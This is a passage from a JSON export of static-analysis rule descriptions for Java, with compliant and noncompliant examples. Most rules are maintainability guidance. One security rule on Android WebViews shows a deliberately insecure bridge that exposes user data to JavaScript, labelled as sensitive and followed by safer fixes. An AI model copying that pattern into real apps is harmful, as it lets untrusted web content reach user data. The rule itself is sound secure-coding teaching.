downstream.push(-1)\n    );\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7482","summary":"Don't provide an initializer for a stateless stream gatherer","tags":["java24"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When a method uses a <code>Gatherer.of(â¦â)</code> factory and provides a combiner function that always throws an exception, this implicitly signals\nthat the gatherer is designed for sequential processing. The <code>java.util.stream.Gatherer</code> API provides\n<code>Gatherer.ofSequential(â¦â)</code> factories which clearly indicates that the gatherer is intended for sequential streams. Using such a factory\nimproves code clarity, makes the intended processing model explicit, and avoids the need for a dummy or throwing combiner.</p>\n<h2>How to fix it</h2>\n<p>Use <code>Gatherer.ofSequential</code> instead of <code>Gatherer.of</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n  public static List&lt;Integer&gt; diffWithFirstPositive(List&lt;Integer&gt; list) {\n    Gatherer&lt;Integer, AtomicInteger, Integer&gt; gatherer = Gatherer.of(\n      () -&gt; new AtomicInteger(-1),\n      (state, number, downstream) -&gt; {\n        if (state.get() &lt; 0) {\n          state.set(number);\n          return true;\n        }\n        return downstream.push(number - state.get());\n      },\n      (_, _) -&gt; {\n        throw new IllegalStateException();\n      },\n      Gatherer.defaultFinisher());\n    return list.stream().gather(gatherer).toList();\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n  public static List&lt;Integer&gt; diffWithFirstPositive(List&lt;Integer&gt; list) {\n    Gatherer&lt;Integer, AtomicInteger, Integer&gt; gatherer = Gatherer.ofSequential(\n      () -&gt; new AtomicInteger(-1),\n      (state, number, downstream) -&gt; {\n        if (state.get() &lt; 0) {\n          state.set(number);\n          return true;\n        }\n        return downstream.push(number - state.get());\n      },\n      Gatherer.defaultFinisher());\n    return list.stream().gather(gatherer).toList();\n  }\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/util/stream/Gatherer.html\">Gatherer API</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/24/core/stream-gatherers.html\">Stream gatherers documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7481","summary":"Gatherer.ofSequential() should be used to build sequential gathers","tags":["java24"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The <code>ClassBuilder</code> API provides multiple ways to declare a method and its body, including <code>withMethod</code> and\n<code>withMethodBody</code>. While they can be used in very similar ways, <code>withMethodBody</code> reduces boilerplate code, lowers cognitive\ncomplexity and improves maintainability.</p>\n<h3>Exceptions</h3>\n<p>The rule will not raise on calls where the method under construction is abstract (eg: using the flag <code>ClassFile.ACC_ABSTRACT</code>).</p>\n<h2>How to fix it</h2>\n<p>Replace the invocation of <code>withMethod</code> with <code>withMethodBody</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nClassBuilder addMethod(ClassBuilder builder) {\n    return builder\n        .withMethod(\"foo\", MTD_void, ACC_PUBLIC | ACC_STATIC, methodBuilder -&gt; { // Noncompliant\n            methodBuilder.withCode(codeBuilder -&gt;\n                codeBuilder.getstatic(ClassDesc.of(\"java.lang.System\"), \"out\", ClassDesc.of(\"java.io.PrintStream\"))\n                    .ldc(\"Hello World\")\n                    .invokevirtual(ClassDesc.of(\"java.io.PrintStream\"), \"println\", MTD_void)\n                    .return_()\n            );\n        });\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nClassBuilder addMethod(ClassBuilder builder) {\n    return builder\n        .withMethodBody(\"foo\", MTD_void, ACC_PUBLIC | ACC_STATIC, codeBuilder -&gt;\n            codeBuilder.getstatic(ClassDesc.of(\"java.lang.System\"), \"out\", ClassDesc.of(\"java.io.PrintStream\"))\n                .ldc(\"Hello World\")\n                .invokevirtual(ClassDesc.of(\"java.io.PrintStream\"), \"println\", MTD_void)\n                .return_()\n        );\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/classfile/package-summary.html#writing-classfiles-heading\">Writing\n  classfiles - classfile Javadoc</a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/classfile/ClassBuilder.html#withMethod(java.lang.classfile.constantpool.Utf8Entry,java.lang.classfile.constantpool.Utf8Entry,int,java.util.function.Consumer)\">withMethod - ClassBuilder Javadoc</a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/classfile/ClassBuilder.html#withMethodBody(java.lang.classfile.constantpool.Utf8Entry,java.lang.classfile.constantpool.Utf8Entry,int,java.util.function.Consumer)\">withMethodBody - ClassBuilder Javadoc</a> </li>\n  <li> <a href=\"https://openjdk.org/jeps/484\">JEP 484: Class-File API</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7479","summary":"\"ClassBuilder.withMethodBody\" should be preferred to \"ClassBuilder.withMethod\"","tags":["java24"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The common pattern of taking a class-file entity, obtaining a corresponding builder, examining each element of the entity and possibly replacing it\nwith other elements can be expressed by transforms. Using the <code>transformClass</code> method in that case instead of <code>build</code> removes\nall that boilerplate and makes the intent clearer.</p>\n<h2>How to fix it</h2>\n<p>Use the <code>ClassFile.transformClass</code> method instead of <code>ClassFile.build</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic static void transformClassFile(Path path) throws IOException {\n  ClassFile classFile = ClassFile.of();\n  ClassModel classModel = classFile.parse(path);\n  byte[] newBytes = classFile.build( // Noncompliant\n    classModel.thisClass().asSymbol(), classBuilder -&gt; {\n        for (ClassElement classElement : classModel) {\n          if (!(classElement instanceof MethodModel methodModel &amp;&amp;\n              methodModel.methodName().stringValue().startsWith(\"debug\"))) {\n            classBuilder.with(classElement);\n\n          }\n        }\n    });\n  Files.write(path, newBytes);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic static void transformClassFile(Path path) throws IOException {\n  ClassFile classFile = ClassFile.of();\n  ClassModel classModel = classFile.parse(path);\n  byte[] newBytes = classFile.transformClass(\n    classModel, (classBuilder, classElement) -&gt; {\n      if (!(classElement instanceof MethodModel methodModel &amp;&amp;\n            methodModel.methodName().stringValue().startsWith(\"debug\"))) {\n          classBuilder.with(classElement);\n        }\n      });\n  Files.write(path, newBytes);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.org/jeps/484\">JEP 484: Class-File API</a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/classfile/ClassFile.html#transformClass(java.lang.classfile.ClassModel,java.lang.classfile.ClassTransform)\">ClassFile API</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7478","summary":"\"transformClass\" method should be used instead of \"build\" when transforming a class","tags":["java24"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>In the classfile API introduced by Java 24, there are several versions of the <code>transformClass</code> methods. In particular if the name of the\ntransformed class is unchanged compared to the original class, then it is recommended to use the simplest version of the method that takes only 2\narguments. This makes the code shorter, clearer, and reduces chances for mistakes.</p>\n<h2>How to fix it</h2>\n<p>Remove the class name argument of the <code>transformClass</code> call.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic static void transformClassFile(Path path) throws IOException {\n    ClassFile classFile = ClassFile.of();\n    ClassModel classModel = classFile.parse(path);\n    byte[] newBytes = classFile.transformClass(classModel,\n      classModel.thisClass().asSymbol(), // Noncompliant\n      (classBuilder, classElement) -&gt; {\n        if (!(classElement instanceof MethodModel methodModel &amp;&amp;\n            methodModel.methodName().stringValue().startsWith(\"debug\"))) {\n            classBuilder.with(classElement);\n        }\n      });\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic static void transformClassFile(Path path) throws IOException {\n    ClassFile classFile = ClassFile.of();\n    ClassModel classModel = classFile.parse(path);\n    byte[] newBytes = classFile.transformClass(classModel,\n      (classBuilder, classElement) -&gt; {\n        if (!(classElement instanceof MethodModel methodModel &amp;&amp;\n            methodModel.methodName().stringValue().startsWith(\"debug\"))) {\n            classBuilder.with(classElement);\n        }\n      });\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://openjdk.org/jeps/484\">JEP 484: Class-File API</a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/classfile/ClassFile.html#transformClass(java.lang.classfile.ClassModel,java.lang.classfile.ClassTransform)\">ClassFile API, transformClass(ClassModel, ClassTransform)</a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/classfile/ClassFile.html#transformClass(java.lang.classfile.ClassModel,java.lang.constant.ClassDesc,java.lang.classfile.ClassTransform)\">ClassFile API, transformClass(ClassModel, ClassDesc, ClassTransform)</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7477","summary":"Class name should be omitted when unchanged by class transform","tags":["java24"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Starting in Java 23, comments beginning with three slashes <code>///</code> are interpreted as JavaDoc comments using Markdown syntax.</p>\n<p>In Java 22 and earlier, comments starting with more than 2 slashes were treated as normal comments. Accidentally writing comments with three or\nmore slashes can lead to unintended JavaDoc being generated, when migrating to Java 23.</p>\n<h3>What is the potential impact?</h3>\n<p>Comments starting with three or more slashes will increase the migration cost when upgrading to Java 23 or later. Moreover, IDE or other tools may\nhandle such comments as JavaDoc comments if they are not aware of the Java version.</p>\n<h3>Exceptions</h3>\n<ul>\n  <li> The rule does not raise issues on license headers at the start of files because they will not be considered as JavaDoc comments. </li>\n  <li> The rule only raises issues in projects using Java 17 or above, because those projects will likely be migrated to Java 23 or later. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>In versions of Java prior to 23, comments should not start with more than 2 slashes, and from Java 23 forward they should not start with more than\n3.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The following code will generate unintended JavaDoc comments if migrated to Java 23:</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n/// Some comment for the developers\npublic abstract void foo();\n//// public void foo(String s){}\npublic void foo(){}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n// Some comment for the developers\npublic abstract void foo();\n// public void foo(String s){}\npublic void foo(){}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OpenJDK - <a href=\"https://openjdk.org/jeps/467\">JEP 467: Markdown Documentation Comments</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-7476","summary":"Comments should start with the appropriate number of slashes","tags":["java23","javadoc"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>When using pattern matching on records, matching is done against the canonical constructor of the record. This implies listing all the components\nin the canonical constructor even if some are unused. To make the intent of not using the component clear, Java 22 introduced the unnamed variable\npattern <code>_</code>.</p>\n<p>Because we can only pattern match against the canonical constructor, there is no need to disambiguate by specifying the types of its parameters.\nTherefore, the type of unused variables in pattern matching should be omitted, as it does not bring additional value.</p>\n<h2>How to fix it</h2>\n<p>Remove the type of the unused component.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nrecord Guest(String name, String email, String phoneNumber) {}\n\nString greet(Object o) {\n    if (o instanceof Guest(String name, String _, String _)) { // Noncompliant\n        return \"Hello \" + name + \"!\";\n    }\n    return \"Hello!\";\n}\n\nString switchToGreet(Object o) {\n    return switch (o) {\n        case Guest(String name, String _, String _) -&gt; \"Hello \" + name + \"!\"; // Noncompliant\n        default -&gt; \"Hello!\";\n    };\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nrecord Guest(String name, String email, String phoneNumber) {}\n\nString greet(Object o) {\n    if (o instanceof Guest(String name, _, _)) {\n        return \"Hello \" + name + \"!\";\n    }\n    return \"Hello!\";\n}\n\nString switchToGreet(Object o) {\n    return switch (o) {\n        case Guest(String name, _, _) -&gt; \"Hello \" + name + \"!\";\n        default -&gt; \"Hello!\";\n    };\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://openjdk.org/jeps/456\">JEP 456: Unnamed Variables &amp; Patterns</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7475","summary":"Types of unused record components should be removed from pattern matching","tags":["java22","unused"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>With the introduction of Markdown support in Javadoc comments in Java 23, developers should prefer Markdown syntax over legacy HTML tags (e.g.,\n<code>&lt;b&gt;</code>, <code>&lt;i&gt;</code>, <code>&lt;code&gt;</code>, <code>&lt;ul&gt;</code>, <code>&lt;li&gt;</code>, etc.) and legacy Javadoc\ntags (e.g. <code>{@link java.util.HashMap}</code>, <code>{@code Object}</code>).</p>\n<p>Mixing HTML and Markdown can lead to readability issues and inconsistencies in rendering across tools. Markdown is generally more readable, less\ncluttered and, should be preferred over HTML tags when possible.</p>\n<p>This rule will raise an issue when an HTML tag or a legacy Javadoc tag inside a markdown comment could be replaced with a slimmer, and more\ncohesive, syntax.</p>\n<h2>How to fix it</h2>\n<p>Here is a list of tags that should be replaced with markdown syntax:</p>\n<ul>\n  <li> <code>&lt;p&gt;</code> should be replaced with 2 new lines </li>\n  <li> <code>&lt;code&gt;MyCode&lt;/code&gt;</code>, <code>{@code MyCode}</code> should be replaced with <code>`MyCode`</code> </li>\n  <li> <code>&lt;i&gt;italic text&lt;/i&gt;</code>, <code>&lt;em&gt;</code> should be replaced with <code>*italic text*</code> </li>\n  <li> <code>&lt;b&gt;bold text&lt;/b&gt;</code>, <code>&lt;strong&gt;</code> should be replaced with <code>**bold text**</code> </li>\n  <li> <code>&lt;ul&gt;&lt;li&gt;list item&lt;/li&gt;&lt;/ul&gt;</code>, <code>&lt;ol&gt;&lt;li&gt;</code> should be replaced with <code>* list\n  item</code> </li>\n  <li> <code>{@link some.java.Class}</code> should be replaced with <code>[some.java.Class]</code> </li>\n  <li> <code>{@link #equals(Object) equals}</code> should be replaced with <code>[equals][#equals(Object)]</code> </li>\n</ul>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n/// This is a markdown Javadoc comment\n/// &lt;b&gt;ExampleClass&lt;/b&gt; is a simple utility for &lt;i&gt;demonstration purposes&lt;/i&gt;.\n/// &lt;p&gt;\n///     Use &lt;code&gt;ExampleClass.run()&lt;/code&gt; to execute the example.\n/// &lt;/p&gt;\n/// {@link some.java.Class} for more details\npublic class ExampleClass {\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n/// This is a markdown Javadoc comment\n/// **ExampleClass** is a simple utility for *demonstration purposes*.\n///\n/// Use `ExampleClass.run()` to execute the example.\n/// [some.java.Class] for more details\npublic class ExampleClass {\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://openjdk.org/jeps/467\">JEP 467: Markdown Documentation Comments</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7474","summary":"Markdown, HTML and Javadoc tags should be consistent","tags":["java23","javadoc"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Good exception management is key to keeping a consistent application state in the face of errors and unexpected behaviors. However, in some cases,\nthe information carried by the exception is not as important as the exception bubbling up itself. In such cases, developers may want to explicitly\nindicate that they have no use for the exception parameter. Java 22 introduces the unnamed variable pattern <code>_</code> which allows developers to\nfree the catch clause from an unnecessary exception parameter name.</p>\n<h2>How to fix it</h2>\n<p>Replace exception parameter name with unnamed variable pattern <code>_</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nList&lt;String&gt; elements = // ...\nint value = 0;\ntry {\n  var elem = elements.get(idx);\n  value = Integer.parseInt(elem);\n} catch (NumberFormatException nfe) { // Noncompliant\n  System.err.println(\"Wrong number format\");\n} catch (IndexOutOfBoundsException ioob) {  // Noncompliant\n  System.err.println(\"No such element\");\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nList&lt;String&gt; elements = // ...\nint value = 0;\ntry {\n  var elem = elements.get(idx);\n  value = Integer.parseInt(elem);\n} catch (NumberFormatException _) {\n  System.err.println(\"Wrong number format\");\n} catch (IndexOutOfBoundsException _) {\n  System.err.println(\"No such element\");\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OpenJDK - <a href=\"https://openjdk.org/jeps/456\">JEP 456: Unnamed Variables &amp; Patterns</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7467","summary":"Unused exception parameter should use the unnamed variable pattern","tags":["java22"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The syntax of some Java constructs, such as enhanced for loops, requires that you declare a variable that you may have no use for. To solve this\nissue, Java 22 introduced an unnamed variable pattern, <code>_</code>. This feature removes the need to name variables that are syntactically required\nbut otherwise unused. Moreover, it clearly indicates the intent not to use the variable.</p>\n<p>To further minimize clutter, unnamed variables should use the <code>var</code> pattern rather than explicit type declarations. In addition to\nminimizing clutter, removing the type makes the code easier to maintain. Indeed, if the type was to change in future, the code would remain the\nsame.</p>\n<h3>Exceptions</h3>\n<p>This rule does not apply to basic <code>for</code> loops and local variable declarations in a block.</p>\n<h2>How to fix it</h2>\n<p>Replace the local variable type with <code>var</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nfor (String _ : myIterable) { // Noncompliant\n  // ...\n}\n\n\ntry (Resource _ = new Resource()) { // Noncompliant\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nfor (var _ : myIterable) {\n  // ....\n}\n\ntry (var _ = new Resource()) {\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> OpenJDK - <a href=\"https://openjdk.org/jeps/456\">JEP 456: Unnamed Variables &amp; Patterns</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"targeted","ruleKey":"RSPEC-7466","summary":"Unnamed variable declarations should use the \"var\" identifier","tags":["java22"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>Mobile devices expose unique identifiers that can be used to identify users across applications or devices. These identifiers put user privacy at\nrisk, as they might allow the tracking of user activity without consent, while making it difficult or impossible for users to reset them.</p>\n<p>Privacy violations can cause apps to be removed from app stores and can result in legal action or loss of trust from users.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The identifier is used to track users between applications or devices. </li>\n  <li> The identifier cannot be easily reset by the user. </li>\n  <li> The identifier is connected to personally identifiable information. </li>\n  <li> The identifier is linked to the device hardware (MAC address, IMEI, etc). </li>\n</ul>\n<p>There is a risk if you answer yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Whenever possible, use identifiers that users can easily reset. </li>\n  <li> Donât link identifiers to personally identifiable information without collecting users' explicit consent. </li>\n  <li> Avoid using identifiers that are linked to the device hardware (MAC address, IMEI, etc). </li>\n  <li> Only use the Advertising ID for user profiling or ads use cases. </li>\n</ul>\n<p>For ads use cases, use the Advertising ID provided by the platform. This identifier is designed to be reset by the user and has an associated\nPersonalized Ads flag.</p>\n<p>For non-ads use cases, the most privacy-friendly identifiers that can be used are:</p>\n<ul>\n  <li> Firebase installation ID (FID) </li>\n  <li> A privately stored GUID generated by the app </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nString uid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID); // Sensitive\nUser user = new User(\n    uid,\n    \"John\",\n    \"Doe\",\n);\n</pre>\n<h2>Compliant Solution</h2>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nString uid = UUID.randomUUID().toString();\nUser user = new User(\n    uid,\n    \"John\",\n    \"Doe\",\n);\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m6-inadequate-privacy-controls\">Mobile Top 10 2024 Category M6 -\n  Inadequate Privacy Controls</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/213\">CWE-213 - Exposure of Sensitive Information Due to Incompatible Policies</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/identity/user-data-ids\">Best practices for unique identifiers</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-7435","summary":"Processing persistent unique identifiers is security-sensitive","tags":["android"],"versions":{"serverEdition":null,"serverVersion":null,"communityVersion":null},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Using JavaScript interfaces in WebViews to expose Java objects is unsafe. Doing so allows JavaScript to invoke Java methods, potentially giving\nattackers access to data or sensitive app functionality. WebViews might include untrusted sources such as third-party iframes, making this\nfunctionality particularly risky. As JavaScript interfaces are passed to every frame in the WebView, those iframes are also able to access the exposed\nJava object.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The content in the WebView is fully trusted and secure. </li>\n  <li> Potentially untrusted iframes could be loaded in the WebView. </li>\n  <li> The JavaScript interface has to be exposed for the entire lifecycle of the WebView. </li>\n  <li> The exposed Java object might be called by untrusted sources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<h3>Disable JavaScript</h3>\n<p>If it is possible to disable JavaScript in the WebView, this is the most secure option. By default, JavaScript is disabled in a WebView, so\n<code>webSettings.setJavaScriptEnabled(false)</code> does not need to be explicitly called. Of course, sometimes it is necessary to enable JavaScript,\nin which case the following recommendations should be considered.</p>\n<h3>Remove JavaScript interface when loading untrusted content</h3>\n<p>JavaScript interfaces can be removed at a later point. It is recommended to remove the JavaScript interface when it is no longer needed. If it is\nneeded for a longer time, consider removing it before loading untrusted content. This can be done by calling\n<code>webView.removeJavascriptInterface(\"interfaceName\")</code>.</p>\n<p>A good place to do this is inside the <code>shouldInterceptRequest</code> method of a <code>WebViewClient</code>, where you can check the URL or\nresource being loaded and remove the interface if the content is untrusted.</p>\n<h3>Alternative methods to implement native bridges</h3>\n<p>If a native bridge has to be added to the WebView, and it is impossible to remove it at a later point, consider using an alternative method that\noffers more control over the communication flow. <code>WebViewCompat.postWebMessage</code>/<code>WebViewCompat.addWebMessageListener</code> and\n<code>WebMessagePort.postMessage</code> offer more ways to validate incoming and outgoing messages, such as by being able to restrict the origins that\ncan send messages to the JavaScript bridge.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\npublic class ExampleActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new JavaScriptBridge(), \"androidBridge\"); // Sensitive\n    }\n\n    public static class JavaScriptBridge {\n        @JavascriptInterface\n        public String accessUserData(String userId) {\n            return getUserData(userId);\n        }\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>The most secure option is to disable JavaScript entirely. {rule:java:S6362} further explains why it should not be enabled unless absolutely\nnecessary.</p>\n<pre>\npublic class ExampleActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(false);\n    }\n}\n</pre>\n<p>If possible, remove the JavaScript interface after it is no longer needed, or before loading any untrusted content.</p>\n<pre>\npublic class ExampleActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        webView.addJavascriptInterface(new JavaScriptBridge(), \"androidBridge\");\n\n        // Sometime later, before unsafe content is loaded, remove the JavaScript interface\n        webView.removeJavascriptInterface(\"androidBridge\");\n    }\n}\n</pre>\n<p>If a JavaScript bridge must be used, consider using <code>WebViewCompat.addWebMessageListener</code> instead. This allows you to restrict the\norigins that can send messages to the JavaScript bridge.</p>\n<pre>\npublic class ExampleActivity extends AppCompatActivity {\n    private static final Set&lt;String&gt; ALLOWED_ORIGINS = Collections.singleton(\"https://example.com\");\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n\n        WebView webView = new WebView(this);\n        webView.getSettings().setJavaScriptEnabled(true);\n\n        WebViewCompat.addWebMessageListener(\n            webView,\n            \"androidBridge\",\n            ALLOWED_ORIGINS, // Only allow messages from these origins\n            new WebMessageListener() {\n                @Override\n                public void onPostMessage(\n                    WebView view,\n                    WebMessageCompat message,\n                    Uri sourceOrigin,\n                    boolean isMainFrame,\n                    JavaScriptReplyProxy replyProxy\n                ) {\n                    // Handle the message\n                }\n            }\n        );\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> Android Documentation - <a href=\"https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges\">Insecure WebView\n  native bridges</a> </li>\n  <li> Android Documentation - <a href=\"https://developer.android.com/reference/androidx/webkit/WebViewCompat\">WebViewCompat API reference</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation.html\">Mobile Top 10 2024\n  Category M4 - Insufficient Input/Output Validation</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m8-security-misconfiguration.html\">Mobile Top 10 2024 Category M8 -\n  Security Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation</a> </li>\n</ul>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S6362} - Enabling JavaScript support for 